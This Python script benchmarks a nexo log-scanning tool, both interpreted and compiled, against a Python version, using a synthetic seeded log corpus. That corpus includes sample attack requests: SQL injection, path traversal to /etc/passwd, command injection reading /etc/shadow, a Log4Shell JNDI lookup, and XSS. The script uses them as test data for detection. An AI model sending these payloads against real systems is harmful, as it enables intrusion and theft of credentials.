"""Measures sentinel.nexo against compare/sentinel.py, as phase 5 of
docs/ai-native-roadmap.md asks: cold start, throughput, peak memory and
the size of what is deployed, for the interpreter, a release build of
the compiler and Python, on the same corpus and settings. The corpus is
made here from a fixed seed. Run it from examples/sentinel:

    python3 compare/bench.py [lines]      # writes compare/bench.json

It needs a release build of the compiler (cargo build --release in
compiler/) to build sentinel.nexo with nexo build --release."""
import json
import os
import platform
import random
import resource
import shutil
import statistics
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent
ROOT = HERE.parent.parent
SEED = 20261127
RUNS = 3

BENIGN = ['GET /index.html 200', 'GET /assets/app.css 200', 'GET /api/v1/orders 200', 'POST /orders 201',
          'GET /search?q=union+station+hotel 200', 'GET /docs/select-or-insert.html 200', 'GET /favicon.ico 404']
ATTACKS = ['GET /products?id=1+UNION+SELECT+name,password+FROM+users 200', 'GET /static/../../etc/passwd 404',
           'GET /ping?host=8.8.8.8;cat+/etc/shadow 200', 'GET /search?q=${jndi:ldap://203.0.113.200/a} 200',
           'GET /comment?text=%3Cscript%3Ealert(1)%3C/script%3E 200', 'GET /.env 404']


def corpus(lines: int) -> str:
    """One line in a hundred is an attack, one in two hundred a failed login."""
    rnd = random.Random(SEED)
    out = []
    for n in range(lines):
        t = f"2026-11-02T{8 + n // 360000 % 12:02d}:{n // 6000 % 60:02d}:{n // 100 % 60:02d}Z"
        address = f"192.0.2.{rnd.randrange(1, 250)}"
        roll = rnd.random()
        if roll < 0.01:
            out.append(f"{t} 198.51.100.{rnd.randrange(1, 250)} web {rnd.choice(ATTACKS)}")
        elif roll < 0.015:
            out.append(f"{t} 203.0.113.{rnd.randrange(1, 60)} sshd login failed user=root")
        else:
            out.append(f"{t} {address} web {rnd.choice(BENIGN)}")
    return "\n".join(out) + "\n"


def folder_for(lines: int) -> Path:
    work = Path(tempfile.mkdtemp(prefix="sentinel-bench-"))
    for name in os.listdir(HERE):
        if name.endswith(".nexo") or name in ("rules.json", "compare", "reputation"):
            source = HERE / name
            (shutil.copytree if source.is_dir() else shutil.copy)(source, work / name)
    (work / "logs").mkdir()
    (work / "logs" / "bench.log").write_text(corpus(lines), encoding="utf-8")
    settings = json.loads((HERE / "sentinel.json").read_text(encoding="utf-8"))
    settings.update(logs=["logs/bench.log"], suppress=[], reputation=[], sources=[], alertmanager="",
                    alert_webhook="", incremental=False, ocsf=False)
    (work / "sentinel.json").write_text(json.dumps(settings), encoding="utf-8")
    return work


def clean(work: Path):
    for name in ("audit.json", "report.json", "sentinel.lock.db", "blocks.json", "state.json"):
        (work / name).unlink(missing_ok=True)


def measure(command: list, work: Path) -> dict:
    """Wall time and peak memory of one run: a child of its own, so its rusage is only its own."""
    clean(work)
    probe = ("import resource,subprocess,sys,time;t=time.perf_counter();"
             "p=subprocess.run(sys.argv[1:],input=b'no\\nno\\n',stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);"
             "w=time.perf_counter()-t;r=resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss;"
             "print(w,r,p.returncode)")
    out = subprocess.run([sys.executable, "-c", probe, *command], cwd=work, capture_output=True, text=True,
                         env=dict(os.environ, PYTHONPATH=str(ROOT)), timeout=3600).stdout.split()
    assert out[2] == "0", f"{command} failed"
    report = (work / "report.json").read_bytes() if (work / "report.json").exists() else b""
    return {"seconds": float(out[0]), "peak_kib": int(out[1]), "report": report}


def best(command: list, work: Path) -> dict:
    runs = [measure(command, work) for _ in range(RUNS)]
    return {"seconds": statistics.median(r["seconds"] for r in runs),
            "peak_kib": max(r["peak_kib"] for r in runs), "runs": RUNS, "report": runs[-1]["report"]}


def size_of(path: Path) -> int:
    if path.is_file():
        return path.stat().st_size
    return sum(p.stat().st_size for p in path.rglob("*") if p.is_file() and "__pycache__" not in p.parts)


def main():
    lines = int(sys.argv[1]) if len(sys.argv) > 1 else 50000
    nexoc = ROOT / "compiler" / "target" / "release" / "nexo"
    if not nexoc.exists():
        sys.exit("build the compiler first: cd compiler && cargo build --release")
    empty, full = folder_for(0), folder_for(lines)
    build = subprocess.run([str(nexoc), "build", "--release", "sentinel.nexo", "-o", "sentinel"], cwd=full,
                           capture_output=True, text=True, timeout=1800)
    assert build.returncode == 0, build.stdout + build.stderr
    shutil.copy(full / "sentinel", empty / "sentinel")
    implementations = {
        "nexo interpreter": [sys.executable, "-m", "nexo.cli", "sentinel.nexo"],
        "nexo release build": ["./sentinel"],
        "python": [sys.executable, "compare/sentinel.py"],
    }
    result = {"lines": lines, "seed": SEED, "host": {"machine": platform.machine(), "system": platform.system(),
                                                      "python": platform.python_version(), "cpus": os.cpu_count()},
              "results": {}}
    reports = {}
    for name, command in implementations.items():
        cold = best(command, empty)
        run = best(command, full)
        reports[name] = run["report"]
        result["results"][name] = {
            "start_seconds": round(cold["seconds"], 3),
            "seconds": round(run["seconds"], 3),
            "lines_per_second": round(lines / max(run["seconds"] - cold["seconds"], 1e-9)),
            "peak_mib": round(run["peak_kib"] / 1024, 1),
        }
    # the three find the same on the whole corpus
    assert len(set(reports.values())) == 1, "the reports differ"
    result["same_report"] = True
    result["findings"] = len(json.loads(reports["python"])["findings"])
    nexo_package = size_of(ROOT / "nexo")
    result["results"]["nexo interpreter"]["deploy_mib"] = round((nexo_package + size_of(HERE / "sentinel.nexo")) / 2**20, 1)
    result["results"]["nexo release build"]["deploy_mib"] = round(size_of(full / "sentinel") / 2**20, 1)
    result["results"]["python"]["deploy_mib"] = round(size_of(HERE / "compare" / "sentinel.py") / 2**20, 2)
    result["notes"] = ("Deployment size counts the program and, for the interpreter, the nexo package; Python itself "
                       "and the Python packages each needs (cryptography) are not counted. Times are the median of "
                       f"{RUNS} runs; lines per second leaves out the start. One host, one run of this script: "
                       "not a benchmark of the languages.")
    (HERE / "compare" / "bench.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
    width = max(len(n) for n in implementations)
    print(f"{'':{width}}  start s  {lines} lines s  lines/s  peak MiB  deploy MiB")
    for name, r in result["results"].items():
        print(f"{name:{width}}  {r['start_seconds']:7}  {r['seconds']:{len(str(lines)) + 8}}  {r['lines_per_second']:7}"
              f"  {r['peak_mib']:8}  {r['deploy_mib']:10}")
    shutil.rmtree(empty)
    shutil.rmtree(full)


if __name__ == "__main__":
    main()
